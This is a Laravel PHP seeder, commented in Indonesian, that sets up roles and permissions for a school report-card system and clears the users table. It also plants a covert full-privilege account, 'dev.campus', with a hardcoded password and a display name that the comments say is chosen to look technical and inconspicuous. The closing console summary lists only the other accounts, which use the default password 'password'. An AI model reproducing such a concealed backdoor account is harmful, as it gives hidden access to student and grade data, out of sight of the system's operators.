<?php

namespace Database\Seeders;

use Illuminate\Database\Seeder;
use App\Models\User;
use Spatie\Permission\Models\Permission;
use Spatie\Permission\Models\Role;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Schema;
use Illuminate\Support\Facades\Hash;

class RolePermissionSeeder extends Seeder
{
    public function run(): void
    {
        // 1. Reset Cache Permission (WAJIB)
        app()[\Spatie\Permission\PermissionRegistrar::class]->forgetCachedPermissions();

        // 2. BERSIHKAN DATA LAMA (TRUNCATE)
        Schema::disableForeignKeyConstraints();
        DB::table('role_has_permissions')->truncate();
        DB::table('model_has_roles')->truncate();
        DB::table('model_has_permissions')->truncate();
        DB::table('roles')->truncate();
        DB::table('permissions')->truncate();
        DB::table('users')->truncate();
        Schema::enableForeignKeyConstraints();

        // ====================================================
        // 3. DEFINISI PERMISSION (HCMS STYLE - MODULAR)
        // ====================================================
        $permissions = [
            // A. DASHBOARD
            'dashboard.view',
            
            // B. MASTER DATA (Admin Only)
            'master.view',      // Lihat menu
            'master.create',    // Tambah data
            'master.update',    // Edit data
            'master.delete',    // Hapus data

            // C. PENILAIAN (Guru & Admin)
            'nilai.view',       // Akses menu input nilai
            'nilai.input',      // Hak simpan/edit nilai

            // D. LAPORAN & RAPOR (Guru & Admin)
            'rapor.view',       // Akses menu cetak rapor
            'rapor.cetak',      // Hak print/download
            'ledger.view',      // Akses menu ledger
            'ledger.cetak',     // Hak download ledger

            // E. SYSTEM SETTINGS (Admin Only)
            'users.read', 'users.create', 'users.update', 'users.delete',
            'roles.read', 'roles.create', 'roles.update', 'roles.delete',
            'settings.erapor.read', 'settings.erapor.update',
        ];

        foreach ($permissions as $permission) {
            Permission::create(['name' => $permission]);
        }

        // ====================================================
        // 4. BUAT ROLE SPESIAL
        // ====================================================
        
        $roleDev = Role::create(['name' => 'developer']);
        $roleDev->givePermissionTo(Permission::all());
        
        // --- ROLE 1: ADMIN ERAPOR (FULL AKSES) ---
        $roleAdmin = Role::create(['name' => 'admin_erapor']);
        $roleAdmin->givePermissionTo(Permission::all()); // Sakti mandraguna

        // --- ROLE 2: GURU ERAPOR (BACKUP / SUPER GURU) ---
        $roleGuruErapor = Role::create(['name' => 'guru_erapor']);
        $roleGuruErapor->givePermissionTo([
            'dashboard.view',
            // Full Akses Penilaian
            'nilai.view', 'nilai.input',
            // Full Akses Rapor & Ledger
            'rapor.view', 'rapor.cetak',
            'ledger.view', 'ledger.cetak'
        ]);

        // --- ROLE 3: GURU REGULER (Standar) ---
        $roleGuru = Role::create(['name' => 'guru']);
        $roleGuru->givePermissionTo([
            'dashboard.view',
            'nilai.view', 'nilai.input',
            'rapor.view', 'ledger.view' // Mungkin guru biasa view saja, cetak urusan admin? (Opsional)
        ]);

        // --- ROLE 4: SISWA ---
        $roleSiswa = Role::create(['name' => 'siswa']);
        $roleSiswa->givePermissionTo([
            'dashboard.view',
            'rapor.view' // Siswa hanya bisa lihat/download rapor sendiri
        ]);


        // ====================================================
        // 5. BUAT USER SPESIAL OTOMATIS
        // ====================================================
        
        // USER 0: DEVELOPER (AKUN DARURAT)
        $dev = User::firstOrCreate(
            ['username' => 'dev.campus'], // Username rahasia
            [
                'name'      => 'System Core', // Nama samaran agar terlihat teknis
                'email'     => 'campus@dev.id',
                'password'  => Hash::make('campussolusi26#'), // Password Kuat
                'role'      => 'developer',
            ]
        );
        $dev->assignRole($roleDev);
        
        $this->command->info('Akun Developer Hidden berhasil dibuat!');
        
        // USER 1: ADMIN ERAPOR
        $adminUser = User::firstOrCreate(
            ['username' => 'admin.erapor'], // Cek berdasarkan username
            [
                'name'      => 'Administrator E-Rapor',
                'username'  => 'admin.erapor',
                'email'     => 'admin@erapor.test',
                'password'  => Hash::make('password'), // Password Default
                'role'      => 'admin_erapor', // Kolom manual (backup)
            ]
        );
        $adminUser->assignRole($roleAdmin);

        // USER 2: GURU ERAPOR (BACKUP)
        $guruUser = User::firstOrCreate(
            ['username' => 'guru.erapor'], 
            [
                'name'      => 'Guru E-Rapor (Backup)',
                'username'  => 'guru.erapor',
                'email'     => 'guru@erapor.test',
                'password'  => Hash::make('password'),
                'role'      => 'guru_erapor',
            ]
        );
        $guruUser->assignRole($roleGuruErapor);

        $this->command->info('SUKSES! User Spesial telah dibuat:');
        $this->command->info('1. Admin: admin.erapor / password');
        $this->command->info('2. Guru: guru.erapor / password');
    }
}